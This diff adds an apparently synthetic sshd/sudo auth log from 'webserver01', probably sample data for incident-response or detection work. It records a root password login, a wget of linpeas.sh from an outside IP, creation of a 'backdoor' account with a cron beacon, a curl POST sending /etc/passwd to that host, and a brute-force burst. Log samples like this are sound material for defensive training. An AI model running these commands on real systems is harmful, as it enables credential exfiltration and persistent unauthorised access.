@@ -1,0 +1,15 @@
+Mar 15 02:10:00 webserver01 sshd[12345]: Accepted password for root from 203.0.113.55 port 54321 ssh2
+Mar 15 02:10:05 webserver01 sshd[12346]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Mar 15 02:10:10 webserver01 sudo[12347]: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.44/tools/linpeas.sh
+Mar 15 02:10:15 webserver01 sudo[12348]: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash linpeas.sh
+Mar 15 02:10:30 webserver01 useradd[12349]: new user: name=backdoor, UID=1337, GID=1337, home=/home/backdoor, shell=/bin/bash
+Mar 15 02:10:35 webserver01 passwd[12350]: password changed for backdoor
+Mar 15 02:11:00 webserver01 cron[12351]: (root) CMD (/home/backdoor/.local/bin/beacon.sh)
+Mar 15 02:11:30 webserver01 sudo[12352]: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -s http://198.51.100.44/collect -X POST -d @/etc/passwd
+Mar 15 02:12:00 webserver01 sshd[12353]: Accepted publickey for backdoor from 203.0.113.55 port 54400 ssh2
+Mar 15 02:12:05 webserver01 sshd[12354]: pam_unix(sshd:session): session opened for user backdoor by (uid=0)
+Mar 15 02:20:00 webserver01 sshd[13000]: Failed password for invalid user admin from 198.51.100.100 port 22222 ssh2
+Mar 15 02:20:01 webserver01 sshd[13001]: Failed password for invalid user admin from 198.51.100.100 port 22223 ssh2
+Mar 15 02:20:02 webserver01 sshd[13002]: Failed password for invalid user admin from 198.51.100.100 port 22224 ssh2
+Mar 15 02:20:03 webserver01 sshd[13003]: Failed password for invalid user admin from 198.51.100.100 port 22225 ssh2
+Mar 15 02:20:04 webserver01 sshd[13004]: Failed password for invalid user admin from 198.51.100.100 port 22226 ssh2
